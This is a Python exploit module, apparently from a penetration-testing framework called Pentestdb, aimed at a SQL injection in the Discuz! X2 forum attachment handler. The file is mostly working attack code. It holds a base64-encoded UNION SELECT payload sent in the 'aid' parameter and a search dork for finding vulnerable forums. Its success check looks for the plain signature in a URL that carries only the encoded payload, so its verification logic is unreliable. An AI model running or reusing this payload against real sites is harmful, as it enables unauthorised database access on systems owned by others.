#!/usr/bin/env python
#-*- coding:utf-8 -*-

'''
Pentestdb, a database for penetration test.
Copyright (c) 2014-2015 alpha1e0
'''

import base64

from script.exploit import Exploit, Result

class DiscuzXSI(Exploit):
    expName = u"DiscuzX 2 forum_attachment SQL注入"
    version = "1.0"
    author = "alpha1e0"
    language = "php"
    appName = "discuz"
    appVersion = "x2"
    reference = ['http://www.wooyun.org/bugs/wooyun-2011-02330']
    description = u'''
        漏洞利用条件：1.discuz x2
        SQL注入漏洞
        gh: inurl:forum.php?mod=attachment
    '''

    def verify(self):
        result = Result()

        sig = '2c1743a391305fbf367df8e4f069f9f9'
        payload = "1' and 1=2 union all select 1,'{0}".format(sig)

        url = self.baseURL if "forum.php" in self.baseURL else self.host+"/forum.php"

        self.params['mod'] = "attachment"
        self.params['findpost'] = "ss"
        self.params['aid'] = base64.b64encode(payload)

        try:
            response = self.http.get(url, params=self.params)
        except self.http.RequestException as error:
            result['FailedInfo'] = {}
            result['FailedInfo']['reason'] = "Connection Error, {0}".format(str(error))
            return result

        if response.status_code == 200:
            if sig in response.request.url:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['Payload'] = payload

        return result
